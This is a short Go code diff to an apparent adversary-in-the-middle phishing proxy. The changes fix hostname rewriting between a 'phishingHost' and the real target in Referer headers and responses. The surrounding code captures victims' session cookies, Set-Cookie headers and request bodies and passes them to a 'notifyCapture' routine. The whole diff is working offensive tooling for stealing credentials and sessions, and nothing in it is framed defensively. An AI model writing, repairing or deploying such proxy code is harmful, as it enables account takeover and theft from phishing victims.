@@ -129,6 +129,8 @@ func serveProxy(w http.ResponseWriter, r *http.Request, upstream string, pl *Phi
 
 			if req.Header.Get("Referer") != "" {
 				req.Header.Set("Referer", strings.Replace(req.Header.Get("Referer"),
+					pl.Hostname, target.Host, 1))
+				req.Header.Set("Referer", strings.Replace(req.Header.Get("Referer"),
 					phishingHost, target.Host, 1))
 			}
 
@@ -141,7 +143,7 @@ func serveProxy(w http.ResponseWriter, r *http.Request, upstream string, pl *Phi
 		},
 		ModifyResponse: func(resp *http.Response) error {
 			capturedCookies := resp.Header.Values("Set-Cookie")
-			rewriteResponse(resp, target.Host, phishingHost, pl)
+			rewriteResponse(resp, target.Host, pl.Hostname, pl)
 			rewriteBody(resp, target.Host, pl.Hostname)
 			go notifyCapture(r, reqBody, victimCookies, capturedCookies, upstream, pl)
 			return nil
